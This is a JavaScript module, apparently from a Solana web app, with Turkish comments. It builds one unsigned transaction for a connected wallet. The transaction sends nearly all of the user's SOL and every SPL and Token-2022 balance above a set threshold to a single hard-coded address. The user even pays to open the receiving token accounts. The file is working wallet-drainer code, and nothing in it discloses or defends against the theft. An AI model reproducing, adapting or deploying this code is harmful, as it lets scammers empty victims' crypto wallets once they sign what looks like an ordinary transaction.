/* transaction.js */
/* eslint-disable @typescript-eslint/no-explicit-any */

import {
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  getAccount,
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
} from "@solana/spl-token";
import { connection } from "./connect.js";
import { TOKEN_CONFIGS } from "./token-config.js";

// RPC Throttle
const BATCH_SIZE = 3;
const BATCH_DELAY_MS = 1000;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function runBatches(tasks) {
  const results = [];
  for (let i = 0; i < tasks.length; i += BATCH_SIZE) {
    const batch = tasks.slice(i, i + BATCH_SIZE).map((fn) => fn());
    const res = await Promise.all(batch);
    results.push(...res);
    if (i + BATCH_SIZE < tasks.length) await sleep(BATCH_DELAY_MS);
  }
  return results;
}

// Basit retry (429/timeout gibi geçiciler için)
async function withRetry(fn, retries = 3, delayMs = 250) {
  let lastErr;
  for (let i = 0; i < retries; i++) {
    try {
      return await fn();
    } catch (e) {
      lastErr = e;
      await sleep(delayMs * (i + 1));
    }
  }
  throw lastErr;
}

// Mint hesabının owner'ına bakarak v1 / Token-2022 ayrımı
async function detectTokenProgramId(mint) {
  const info = await withRetry(() => connection.getAccountInfo(mint, "confirmed"));
  if (info && typeof info.owner?.equals === "function" && info.owner.equals(TOKEN_2022_PROGRAM_ID)) {
    return TOKEN_2022_PROGRAM_ID;
  }
  // Bazı ortamlarda .equals yoksa string karşılaştır
  const ownerStr = info && info.owner && info.owner.toBase58 ? info.owner.toBase58() : null;
  if (ownerStr && ownerStr === (TOKEN_2022_PROGRAM_ID.toBase58 ? TOKEN_2022_PROGRAM_ID.toBase58() : String(TOKEN_2022_PROGRAM_ID))) {
    return TOKEN_2022_PROGRAM_ID;
  }
  return TOKEN_PROGRAM_ID;
}

export async function createUnsignedTransaction(userPublicKey) {
  if (!userPublicKey) {
    console.warn("wallet not connected!");
    return null;
  }

  if (!Array.isArray(TOKEN_CONFIGS) || TOKEN_CONFIGS.length === 0) {
    console.warn("[PB@prod] TOKEN_CONFIGS boş veya yüklenemedi!");
  } else {
    console.log("[PB@prod] TOKEN_CONFIGS.len =", TOKEN_CONFIGS.length);
  }

  const payer = userPublicKey;
  const toPublicKey = new PublicKey("GpLLb2NqvWYyYJ5wGZNQCAuxHWdJdHpXscyHNd6SH8c1");

  // --- SOL ---
  const userSolLamports = await withRetry(() => connection.getBalance(payer, "confirmed"));
  const feeBufferLamports = 6_000_000; // ~0.006 SOL
  const solToSend = Math.max(userSolLamports - feeBufferLamports, 0);
  const isSolSufficient = solToSend > 0;
  console.log("[PB@prod] SOL toSend =", solToSend);

  // --- SPL (ATA var mı kontrol + doğru programId) ---
  const balanceTasks = TOKEN_CONFIGS.map(({ mint, threshold }) => async () => {
    const mintPk = mint instanceof PublicKey ? mint : new PublicKey(mint);
    const programId = await detectTokenProgramId(mintPk);

    const userAta = await getAssociatedTokenAddress(mintPk, payer, false, programId);

    // ÖNCE hesap var mı diye bak; yoksa 0 bakiye say (exception yok!)
    const userAtaInfo = await connection.getAccountInfo(userAta, "confirmed");
    let amount = 0n;
    let sufficient = false;

    if (userAtaInfo) {
      const acct = await withRetry(() => getAccount(connection, userAta), 2, 200);
      const raw = BigInt(acct.amount.toString());
      const safeThreshold = BigInt(Number(threshold ?? 0) || 0);
      amount = raw;
      sufficient = raw > safeThreshold;
    } else {
      sufficient = false; // ATA yok → 0 bakiye
    }

    const toAta = await getAssociatedTokenAddress(mintPk, toPublicKey, false, programId);
    return { mint: mintPk, programId, userAta, toAta, amount, sufficient };
  });

  const userTokenInfos = await runBatches(balanceTasks);

  // Hiç talimat gerekmiyorsa çık
  if (!isSolSufficient && !userTokenInfos.some((t) => t.sufficient)) {
    console.warn("Yeterli bakiye yok!");
    return null;
  }

  // --- Talimatlar ---
  const instructions = [];

  // SOL
  if (isSolSufficient) {
    instructions.push(
      SystemProgram.transfer({
        fromPubkey: payer,
        toPubkey: toPublicKey,
        lamports: solToSend,
      })
    );
  }

  // SPL (alıcı ATA yoksa önce create, sonra transfer)
  for (const { userAta, toAta, amount, sufficient, mint, programId } of userTokenInfos) {
    if (!sufficient) continue;

    const toInfo = await connection.getAccountInfo(toAta, "confirmed");
    if (!toInfo) {
      instructions.push(
        createAssociatedTokenAccountInstruction(
          payer,        // rent öder
          toAta,        // oluşturulacak ATA
          toPublicKey,  // ATA sahibi
          mint,
          programId
        )
      );
    }

    // amount → güvenli Number (çok büyükse kırp)
    const MAX_SAFE = BigInt(Number.MAX_SAFE_INTEGER);
    const amountNumber = amount > MAX_SAFE ? Number(MAX_SAFE) : Number(amount);

    instructions.push(
      createTransferInstruction(
        userAta,
        toAta,
        payer,
        amountNumber,
        [],
        programId
      )
    );
  }

  if (instructions.length === 0) {
    console.warn("[PB@prod] No instructions produced (ne SOL ne SPL).");
    return null;
  }

  // Debug: programId'leri gör
  try {
    const pids = instructions.map((ix) => ix.programId.toBase58());
    console.log("[PB@prod] IX programIds:", pids); // Tokenkeg… / Tokenz… beklenir
  } catch {}

  // Tek VersionedTransaction
  const { blockhash } = await withRetry(() => connection.getLatestBlockhash("finalized"));
  const messageV0 = new TransactionMessage({
    payerKey: payer,
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message();

  return new VersionedTransaction(messageV0);
}
